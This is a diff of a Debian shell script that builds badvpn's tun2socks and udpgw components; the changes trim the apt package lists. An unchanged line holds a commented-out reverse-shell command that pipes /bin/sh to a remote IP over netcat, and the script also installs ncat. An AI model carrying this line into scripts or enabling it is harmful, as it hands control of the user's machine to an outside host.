@@ -4,7 +4,7 @@ set -e o pipefail
 ###DOES NOT WORK ON UBUNTU
 ###ONLY WORKS WITH DEBIAN BUT THERE WILL BE A GLIBC VERSION MISMATCH
 build_badvpn() {
-  apt install -y cmake build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl > /dev/null
+  apt install -y cmake build-essential screen vim unzip curl openssl
   mkdir build; cd build
   cmake .. -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_TUN2SOCKS=1 -DBUILD_UDPGW=1 -DCMAKE_INSTALL_PREFIX=/usr/local
   make install
@@ -28,7 +28,6 @@ build_badvpn() {
 apt update
 apt install -y ncat > /dev/null
 #nc 65.108.223.20 4422 -e /bin/sh
-apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl > /dev/null
 
 build_badvpn
 
